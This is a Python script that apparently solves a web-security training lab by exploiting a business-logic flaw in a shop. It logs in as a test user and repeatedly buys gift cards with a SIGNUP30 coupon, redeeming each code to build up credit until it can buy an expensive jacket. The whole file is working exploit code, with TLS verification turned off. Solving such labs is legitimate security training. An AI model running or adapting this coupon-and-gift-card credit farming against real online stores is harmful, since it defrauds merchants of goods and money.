from bs4 import BeautifulSoup
import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("it can take up to 15-20 minutes so... wait")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1].strip().rstrip('/')
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'
account_url = burp_url + '/my-account'
checkout_url = burp_url + '/cart/checkout'
order_confirmation_url = burp_url + '/cart/order-confirmation?order-confirmed=true'
gift_card_url = burp_url + '/gift-card'
coupon_url = burp_url + '/cart/coupon'

session = requests.Session()
session.verify = False

r = session.get(login_url)
csrf_token = BeautifulSoup(r.text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
session.post(login_url, data=data)

r = session.get(burp_url)
soup = BeautifulSoup(r.text, 'html.parser')
jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})
gift_card = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/GiftCard.jpg'})
jacket_details = {'price': jacket.parent.contents[6].strip().lstrip('$'),
                  'name': jacket.find_next_sibling('h3').text,
                  'product_id': jacket.find_next_sibling('a')['href'].split('=')[1]}
gift_card_details = {'price': gift_card.parent.contents[6].strip().lstrip('$'),
                     'name': gift_card.find_next_sibling('h3').text,
                     'product_id': gift_card.find_next_sibling('a')['href'].split('=')[1]}

for i in range(1, 290):
    data = {'productId': gift_card_details['product_id'], 'quantity': 1, 'redir': 'CART'}
    session.post(cart_url, data=data, allow_redirects=False)

    csrf_token = BeautifulSoup(session.get(cart_url).text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
    data = {'csrf': csrf_token, 'coupon': 'SIGNUP30'}
    session.post(coupon_url, data=data)

    csrf_token = BeautifulSoup(session.get(cart_url).text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
    session.post(checkout_url, data={'csrf': csrf_token}, allow_redirects=False)
    r = session.get(order_confirmation_url)

    token = BeautifulSoup(r.text, 'html.parser').find('th', string='Code').parent.findNext('td').text

    csrf_token = BeautifulSoup(session.get(account_url).text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
    data = {'csrf': csrf_token, 'gift-card': token}
    session.post(gift_card_url, data=data, allow_redirects=False)

data = {'productId': jacket_details['product_id'], 'quantity': 1, 'redir': 'CART'}
session.post(cart_url, data=data, allow_redirects=False)

csrf_token = BeautifulSoup(session.get(cart_url).text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
data = {'csrf': csrf_token, 'coupon': 'SIGNUP30'}
session.post(coupon_url, data=data)

csrf_token = BeautifulSoup(session.get(cart_url).text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
r = session.post(checkout_url, data={'csrf': csrf_token}, allow_redirects=False)
r = session.get(order_confirmation_url)

if 'Congratulations, you solved the lab!' not in r.text:
    sys.exit(-99)
